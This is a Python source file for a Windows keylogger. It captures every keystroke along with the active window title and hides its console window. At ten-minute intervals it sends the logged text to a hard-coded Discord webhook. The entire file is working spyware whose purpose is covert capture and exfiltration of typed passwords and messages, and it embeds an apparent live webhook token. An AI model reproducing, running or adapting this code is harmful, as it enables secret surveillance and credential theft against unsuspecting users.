import time
import requests
from pynput import keyboard
import os
import sys
import win32gui
import threading

WEBHOOK_URL = 'https://discord.com/api/webhooks/1350143720145686569/UcPvfxaryQuULwxeoIZCaPSPP57PiF9O6MDbWcmzpMyM-8PiLtrBaKEibfOmSH0jVrXf'

key_buffer = []
current_window = None

def get_active_window_title():
    """Get the title of the currently active window."""
    window = win32gui.GetForegroundWindow()
    title = win32gui.GetWindowText(window)
    return title

def send_to_discord(message):
    """Send the message to Discord using the webhook."""
    data = {
        "content": message
    }
    try:
        requests.post(WEBHOOK_URL, json=data)
    except Exception as e:
        print(f"Failed to send to Discord: {e}")

def on_press(key):
    """Callback function that is called whenever a key is pressed."""
    global current_window
    try:
        new_window = get_active_window_title()
        if new_window != current_window:
            current_window = new_window
            key_buffer.append(f"\n[Window: {current_window}]\n")
        key_buffer.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            key_buffer.append(' ')
        elif key == keyboard.Key.enter:
            key_buffer.append('\n')
        elif key == keyboard.Key.backspace:
            if key_buffer:
                key_buffer.pop()
        else:
            key_buffer.append(f'[{key}]')

def log_keys():
    """Log the keys and send them to Discord every hour."""
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    while True:
        time.sleep(600)  # Wait for an hour
        if key_buffer:
            logged_keys = ''.join(key_buffer)
            send_to_discord(f"Keylog:\n```\n{logged_keys}\n```")
            key_buffer.clear()  # Clear the buffer after sending

def run_in_background():
    """Run the script in the background on Windows."""
    # Hide the console window
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    # Start the keylogger
    log_keys()

if __name__ == "__main__":
    run_in_background()
